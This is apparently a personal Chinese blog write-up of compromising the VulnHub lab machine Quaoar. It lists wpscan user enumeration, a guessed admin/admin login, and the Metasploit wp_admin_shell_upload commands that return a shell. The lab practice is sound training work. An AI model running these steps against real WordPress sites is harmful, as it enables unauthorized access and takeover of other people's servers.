vulnhub里有一个靶机Quaoar提供了一个WordPress漏洞利用，很有意思，本周末实践了一下，

下载地址https://download.vulnhub.com/hackfest2016/Quaoar.ova，

还是首先在局域网内找到这个靶机，家用宽带环境，基本都是平板和手机，看到开http和ssh的肯定就是它了，

反正详细服务信息对漏洞利用也没啥用，就不扫了，

访问一下页面看看，

尝试访问robots文件，还真有，

那这个渗透方向就确定了，WordPress，

先访问确认一下url，

用wpscan扫一下用户，

wpscan --url http://192.168.128.102/wordpress –-enumerate u，

Kali自带的版本有问题，一直更新数据库，

搞个ubuntu自行安装wpscan也一样，就是给你更新数据库，不往下走，

咋整呢，试试docker吧，
docker pull wpscanteam/wpscan，

docker run -it --rm wpscanteam/wpscan --url http://192.168.128.102/wordpress --enumerate u，

这就把用户扫出来了，

wpscan这软件做的真差，竟然都不支持默认爆破密码，然后这个docker版本你给指定密码列表文件还不认，没办法，以后再研究安装个正常的wpscan再搞吧，目前怎么办呢，就假设弱口令吧，admin的密码安装完就没改过，还是admin，

登录一下还真是，

那这就好办了，上Kali，上metasploit，

use exploit/unix/webapp/wp_admin_shell_upload，

set RHOST 192.168.128.102，

set TARGETURI /wordpress，

set USERNAME admin，

set PASSWORD admin，

exploit，

看见没，shell这就过来了，

WordPress这啥情况，就一个弱口令，shell就被拿走了，

以后再实践提权。
